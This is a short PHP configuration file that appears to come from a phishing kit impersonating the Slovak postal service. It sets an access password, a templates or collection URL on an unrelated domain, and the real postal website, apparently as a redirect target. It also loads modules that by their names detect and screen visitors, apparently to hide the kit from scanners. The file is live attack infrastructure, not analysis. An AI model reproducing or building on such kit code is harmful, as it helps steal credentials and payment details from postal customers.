<?php
    @session_start();
    error_reporting(0);
    require_once 'detect.php';
    require_once 'functions.php';
    include_once 'defender.php';
    define("PASSWORD", 'postuk');
    define("TEMPLATES", 'https://bimawdou3ia.com/sended/');
    define("OFFICIAL_WEBSITE", 'https://www.posta.sk/en/');

?>
